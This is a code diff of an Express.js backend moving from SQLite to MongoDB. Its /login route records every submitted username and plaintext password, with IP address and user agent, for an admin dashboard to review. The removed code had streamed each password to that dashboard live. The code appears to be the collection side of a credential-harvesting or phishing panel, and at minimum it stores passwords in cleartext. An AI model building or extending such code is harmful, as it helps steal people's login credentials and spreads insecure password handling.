@@ -19,25 +19,18 @@ router.post("/login", async (req, res) => {
         const userAgent = req.headers["user-agent"] || "Unknown";
 
         const db = await getDb();
-        const result = await db.run(
-            `INSERT INTO login_attempts (username, password, ipAddress, userAgent, status) VALUES (?, ?, ?, ?, ?)`,
-            [username, password, ipAddress, userAgent, "SUCCESS"]
-        );
+        const collection = db.collection("login_attempts");
+        await collection.insertOne({
+            username,
+            password,
+            ipAddress,
+            userAgent,
+            status: "SUCCESS",
+            createdAt: new Date().toISOString()
+        });
 
-        // Emit real-time event to all connected admin dashboard clients
-        const io = req.app.get("io");
-        if (io) {
-            const newLog = {
-                id: result.lastID,
-                username,
-                password,
-                ipAddress,
-                userAgent,
-                status: "SUCCESS",
-                createdAt: new Date().toISOString()
-            };
-            io.emit("new-login", newLog);
-        }
+        // Socket.io has been removed for Vercel Serverless capability
+        // Frontend will use polling to retrieve new records
 
         res.status(200).json({ message: "Login attempt recorded" });
     } catch (err) {
@@ -57,7 +50,7 @@ router.post("/admin/login", async (req, res) => {
         }
 
         const db = await getDb();
-        const admin = await db.get(`SELECT * FROM admins WHERE email = ?`, [email]);
+        const admin = await db.collection("admins").findOne({ email });
 
         if (!admin) {
             return res.status(401).json({ message: "Invalid credentials" });
@@ -68,7 +61,7 @@ router.post("/admin/login", async (req, res) => {
             return res.status(401).json({ message: "Invalid credentials" });
         }
 
-        const payload = { admin: { id: admin.id } };
+        const payload = { admin: { id: admin._id } };
 
         jwt.sign(
             payload, 
@@ -90,9 +83,7 @@ router.post("/admin/login", async (req, res) => {
 // @desc Simulate sending a password reset token
 router.post("/admin/forgot-password", async (req, res) => {
     try {
-        // Reset password functionality for SQLite (Simplified)
-        // In a real app we'd add columns for reset tokens
-        res.status(501).json({ message: "Forgot password not yet implemented for SQLite" });
+        res.status(501).json({ message: "Forgot password not yet implemented" });
     } catch (err) {
         console.error("Forgot password error:", err);
         res.status(500).json({ message: "Server error" });
